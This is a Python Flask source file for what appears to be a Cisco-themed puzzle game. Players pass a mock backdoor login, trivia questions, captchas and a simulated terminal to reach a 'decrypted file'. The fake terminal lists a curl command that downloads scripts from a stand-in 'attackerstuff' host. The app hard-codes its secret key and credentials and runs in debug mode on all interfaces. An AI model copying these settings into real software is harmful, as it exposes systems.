'''
Simple Flask application to test deployment to Amazon Web Services
Uses Elastic Beanstalk and RDS

Author: Scott Rodkey - rodkeyscott@gmail.com

Step-by-step tutorial: https://medium.com/@rodkey/deploying-a-flask-application-on-aws-a72daba6bb80
'''

from flask import Flask, render_template, request, redirect, url_for
from application.forms import EnterSecAnswer, EnterLogin, AcceptOrDeclineForm, ContinueButtonForm

# Elastic Beanstalk initalization
application = Flask(__name__)
application.debug=True
# change this to your own value
application.secret_key = 'cC1YCIWOj9GgWspgNEo2'
images_folder = "static/images/"
file_key = "aUQLdRStw5T11236reDPQukdcMyKlwAd"
file_name_id = "sdg3p79f6mFeZ7Si" 
file_location = "/" + file_name_id + "_toppest_of_secret_file"
final_command = "./decryptfile.bash " + file_location + " " + file_key 
print(final_command)
num_passed = 0
page_names = {
    "backdoor_login": "myfirstbackdoor",
    "security_questions": "security_questions",
    "terminal": "bash",
    "terminal2": "bash_attackerstuff",
    "extract_key": "keyextractor",
    "captcha": "captcha",
    "key_extracted": "Mm95sE1uvSaG3NL1cUAxgH5WkRIMCo0I",
    "decrypted_file": file_location[1:],
}

login_creds = ["rygrange", "chic0theman0"]
seq_q_and_a_ids = [
    "dm6H5bAyl7b7i6fMC45Vzq7gngh2IRtR",
    "6Cj8li3wYizzmOzz9K77YO3UPDqnstUZ",
    "Txsh2IT77rBfEDztbfdJpFpnJhoxmY5l",
    "bKwvTRUbL5r9bHL0TvS34Ez1EWapE2pn",
    "1Wi5OoFrA5wyEP4OqczIyobIZbkTWlZk",
    "0XxN10EjtXLk0iKn40j85E3WDROPjXAH",
]
captcha_ids = [
    "6@sUmx*g^Jx2SJfolyyQwcLmJXESYb2H",
    "AN43DnJd7Ot9FQ0vSsKjNGaE4mHaGPFz",
    "3nP4Cg4nct4oX19xjMOXWRUYkjLGPHQ5"
]

sec_q_and_as = {
    seq_q_and_a_ids[0]: 
        {"title": "Please answer this security question to verify identity for",
         "question": "What hobby are you doing now most during these COVID-19 times?",
         "answer": "cooking and baking",
         "place_holder": "Enter rygrange COVID-19 hobby here",
         "next_id": seq_q_and_a_ids[1]},
    seq_q_and_a_ids[1]:
        {"title": "Please answer this security question to verify identity for",
         "question": "What is the most common delivery method for computer viruses? ",
         "answer": ["email attachments", "email", "emails"],
         "place_holder": "Enter answer here",
         "next_id": seq_q_and_a_ids[2]},
    seq_q_and_a_ids[2]:
        {"title": "Please answer this security question to verify identity for",
         "question": "63% of confirmed data breaches leverage a weak, default, or stolen _____. ",
         "answer": "passwords",
         "place_holder": "Enter answer here",
         "next_id": page_names["terminal"]},
    seq_q_and_a_ids[3]:
        {"title": "Alright let's answer some security questions to verify you should be allowed to extract the key",
         "question": "Cisco was originated at what university campus?",
         "answer": ["stanford university", "stanford"],
         "place_holder": "Enter Cisco's origin location",
         "next_id": seq_q_and_a_ids[4]},
    seq_q_and_a_ids[4]:
        {"title": "That could have just been a lucky guess. Here's another",
         "question": "------------ is Cisco’s fastest growing business unit ",
         "answer": ["cybersecurity", "cyber-security"],
         "place_holder": "Enter fastest growing BU",
         "next_id": seq_q_and_a_ids[5]}, 
    seq_q_and_a_ids[5]:
        {"title": "Hmmmm you are doing pretty well maybe I should let you have the key. Here's one more question.",
         "question": "Cisco’s logo is based off of what (famous structure)?",
         "answer": ["san francisco bridge", "sf bridge", "golden gate bridge", "golden gate"],
         "place_holder": "Enter what the logo is based off of",
         "next_id": captcha_ids[0]},
}

captcha_dict = {
    captcha_ids[0]:
        {"question": "Verify you are human. What is this person attempting to draw?",
         "word_hint": "____o _o_o",
         "answer": "cisco logo",
         "place_holder": "Enter answer here if human",
         "image": {"src": images_folder + "cisco_draw.gif", "alt": "Drawing of bars. One tall surrounded by two short"},
         "next_id": captcha_ids[1]},
         
    captcha_ids[1]:
        {"question": "What is this person attempting to draw?",
         "word_hint": "____",
         "answer": "wifi",
         "place_holder": "Enter answer here if human",
         "image": {"src": images_folder + "guess_me2.gif", "alt": "Drawing of concentric arcs above a central dot"},
         "next_id": captcha_ids[2]},
    captcha_ids[2]:
        {"question": "What is this piece of equipment?",
         "word_hint": "______",
         "answer": "router",
         "place_holder": "Enter answer here if human",
         "image": {"src": images_folder + "whatami.jpg", "alt": "Drawing of concentric arcs above a central dot"},
         "next_id": page_names["key_extracted"]}
}
terminal_commands = {
    "curl -R -k 'http://attackerstuff/' -O": """\
downloaded attackerstuff/decryptfile.bash
downloaded attackerstuff/findfile.bash
downloaded attackerstuff/getkey.bash
downloaded attackerstuff/getlocationhint.bash\
""",
    "ls": "lostfile lostfolder secretfolder",
    "cd lostfolder": "Nothing in here to see",
    "cd secretfolder": "Nothing in here to see",
    "cd attackerstuff": "" ,
    "cat lostfile": "This is a lost file. Please send it back home." ,
    "pwd": "/You/are/here",
    "whoami": "nobody_important",
    "date": "dawn of time",
    "__invalid__": "Invalid Command"
}
terminal2_commands = {
    "ls": "decryptfile.bash findfile.bash getkey.bash getlocationhint.bash",
    "cat lostfile": "This is a lost file. Please send it back home.",
    "pwd": "/You/are/here",
    "whoami": "nobody_important",
    "date": "dawn of time",
    "./decryptfile.bash": "Try command again using the following format ./decryptfile.bash <file location> <decrypt key>",
    "./findfile.bash": "Try command again using the following format ./findfile.bash <location details>",
    "./findfile.bash 10868": "Found the file at: '" + file_location + "'. It is encrypted. Use ./getkey.bash to export the key and ./decryptfile.bash to decrypt it with the key",
    "./getkey.bash": "",
    "./getlocationhint.bash": "The number of protruding rocks in front of Cisco Building 10 San Jose + the number of flag poles around the entrance of building 10 + the number of rectangular bricks acting as rays in the sun circle in front of Cisco RTP building 5 + number on the blue awning on the front of Cisco Knoxville Building 1. Use ./findfile <value> to get the secret file location",
    final_command: "",
    "__invalid__": "Invalid Command",
}

@application.route('/', methods=['GET', 'POST'])
def index():
    return render_template('index.html')



@application.route('/' + page_names["backdoor_login"], methods=['GET', 'POST'])
def backdoor_login():
    global images_folder
    html_template = 'backdoor.html'
    image = images_folder + "shhh.jpg"
    place_holder = ""
    form = EnterLogin(request.form)
    feedback = None
    if request.method == 'POST' and form.validate():
        user_entered = form.user.data
        password_entered = form.password.data
        if (user_entered, password_entered) == (login_creds[0], login_creds[1]):
            return redirect(url_for('security_questions', id=seq_q_and_a_ids[0]))
        feedback = "Credentials Invalid"
        image = images_folder + "ahhahhahh.jpg"
    
    return render_template(html_template, placeholder=place_holder, image=image, form=form, feedback=feedback)

@application.route('/' + page_names["security_questions"] + "<id>", methods=['GET', 'POST'])
def security_questions(id):
    html_template = 'secquestion.html'
    form = EnterSecAnswer(request.form)
    title = sec_q_and_as[id]["title"]
    question = sec_q_and_as[id]["question"]
    place_holder = sec_q_and_as[id]["place_holder"]
    feedback = None
    if request.method == 'POST' and form.validate():
        answer = form.answer.data.lower()
        correct_answers= sec_q_and_as[id]["answer"]
        isstr = isinstance(sec_q_and_as[id]["answer"], str)
        if (isstr and answer == correct_answers)\
            or (not isstr and answer in correct_answers):
            next_id = sec_q_and_as[id]["next_id"]
            if next_id == page_names["terminal"]:
                return redirect(url_for('terminal'))
            elif next_id == captcha_ids[0]:
                return redirect(url_for("captcha", id=next_id))
            else:
                return redirect(url_for("security_questions", id=next_id))
        feedback = "Answer Invalid Try Again"

    return render_template(html_template, title=title, form=form, question=question,
                           place_holder=place_holder, feedback=feedback)

@application.route('/' + page_names["terminal"], methods=['GET', 'POST'])
def terminal():
    html_template = 'terminal.html'
    form = EnterSecAnswer(request.form)
    question = "Ready for input"
    place_holder = ""
    image = None
    feedback = None
    if request.method == 'POST' and form.validate():
        answer = form.answer.data
        if answer in terminal_commands:
            if terminal_commands[answer]:
                feedback = terminal_commands[answer]
            else:
                return redirect(url_for("terminal2"))
        else:
            feedback = terminal_commands["__invalid__"]
    return render_template(html_template, image=image, form=form, question=question,
                           place_holder=place_holder, feedback=feedback)
@application.route('/' + page_names["terminal2"], methods=['GET', 'POST'])
def terminal2():
    html_template = 'terminal.html'
    form = EnterSecAnswer(request.form)
    question = "Inside folder attackerstuff. Ready for input"
    place_holder = ""
    image = None
    feedback = None
    if request.method == 'POST' and form.validate():
        answer = form.answer.data
        if answer in terminal2_commands:
            if terminal2_commands[answer]:
                feedback = terminal2_commands[answer]
            else:
                if answer == final_command:
                    return redirect(url_for("decrypted_file"))
                elif answer == "./getkey.bash":
                    return redirect(url_for("extract_key", times=0))
        else:
            feedback = terminal2_commands["__invalid__"]

    return render_template(html_template, image=image, form=form, question=question,
                           place_holder=place_holder, feedback=feedback)

@application.route('/' + page_names["extract_key"] + "<times>", methods=['GET', 'POST'])
def extract_key(times):
    global images_folder
    try:
        times = int(times)
    except:
        return render_template('call_the_cops.html')
    html_template = 'extract_key.html'
    form = AcceptOrDeclineForm(request.form)
    questions = """This operation will export the key from storage.
    KeyExtractor is not liable for any loss of this key after export.""".splitlines()
    question_suffixes = ["Are you sure you want to continue?", "Are you very sure?", "How sure are you? Is this really what you want?"]
    if times > len(question_suffixes) - 1 or times < 0:
        return redirect(url_for("security_questions", id=seq_q_and_a_ids[3]))
    questions.append(question_suffixes[times])
    image = images_folder + "keyextractor.png"
    feedback = None
    if request.method == 'POST' and form.validate():
        if form.accept.data:
            return redirect(url_for("extract_key", times=times + 1))
        elif form.decline.data:
            return redirect(url_for("terminal2"))
        else:
            return render_template('call_the_cops.html')
    return render_template(html_template, image=image, form=form, questions=questions, feedback=feedback)

@application.route('/captcha<id>', methods=['GET', 'POST'])
def captcha(id):
    html_template = 'captcha.html'
    captcha_dict_entry = id
    if captcha_dict_entry not in captcha_dict:
        return render_template('call_the_cops.html')
    question = captcha_dict[captcha_dict_entry]['question']
    answer = captcha_dict[captcha_dict_entry]['answer']
    place_holder = captcha_dict[captcha_dict_entry]['place_holder']
    form = EnterSecAnswer(request.form)
    image = captcha_dict[captcha_dict_entry]['image']
    word_hint = captcha_dict[captcha_dict_entry]['word_hint']
    print(image)
    feedback = None

    if request.method == 'POST' and form.validate():
        data_entered = form.answer.data
        if data_entered.lower() == answer.lower():
            next_id = captcha_dict[id]["next_id"]
            if next_id == page_names["key_extracted"]:
                return redirect(url_for('key_extracted'))
            else:
                return redirect(url_for("captcha", id=next_id))
        feedback = ':-( Wrong Answer. Are you really Human?'

    return render_template(html_template, image=image, word_hint=word_hint, form=form, question=question,
                           place_holder=place_holder, feedback=feedback)


@application.route('/' + page_names["key_extracted"], methods=['GET', 'POST'])
def key_extracted():
    global images_folder
    global file_key
    html_template = "key_extracted.html" 
    form = ContinueButtonForm(request.form)
    form.html_class = "btn btn-primary"
    image = images_folder + 'masterkey.jpeg'
    feedback = None

    if request.method == 'POST' and form.validate():
        if form.action.data:
           return redirect(url_for("terminal2"))
        feedback = ':-( What are you trying to ruin now?'

    return render_template(html_template, key=file_key, image=image, form=form, feedback=feedback)

@application.route('/' + page_names["decrypted_file"], methods=['GET', 'POST'])
def decrypted_file():
    global images_folder
    global num_passed
    background_color=""

    if num_passed == 0:
        html_template = "winner.html"
        image = images_folder + 'winner.jpg'
        background_color = "rgb(215, 190, 105)"
    else:
        html_template = "too_slow.html"
        image = images_folder + 'too_slow.jpg'
        if num_passed == 1:
            background_color = "rgb(190, 194, 203)"
        elif num_passed == 2:
            background_color = "rgb(169, 113, 66)"
        else:
            background_color = "beige"
    num_passed += 1

    return render_template(html_template, num_passed=num_passed - 1, image=image, background_color=background_color)

if __name__ == '__main__':
    application.run(host='0.0.0.0')
